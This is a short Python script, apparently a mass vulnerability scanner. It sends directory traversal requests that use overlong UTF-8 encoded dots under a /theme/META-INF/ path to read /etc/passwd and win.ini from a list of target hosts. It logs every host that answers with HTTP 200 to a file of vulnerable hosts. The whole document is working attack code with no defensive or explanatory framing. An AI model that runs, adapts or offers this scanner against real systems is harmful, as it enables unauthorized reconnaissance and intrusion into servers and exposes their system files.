import requests
import time


payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_windos = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
try:
    for ip in open('ip.txt'):
        print('check->'+ip)
        ip = ip.replace('\n','')
        url = ip
        data_linux = requests.get(url+payload_linux,verify=False).status_code#请求状态码
        data_windows = requests.get(url+payload_windos,verify=False).status_code#请求状态码
        if data_linux == 200 or data_windows == 200:
            with open(r'vuln.txt','a+') as f:
                f.write(ip+'\n')
        time.sleep(0.5)
except Exception as e :
    pass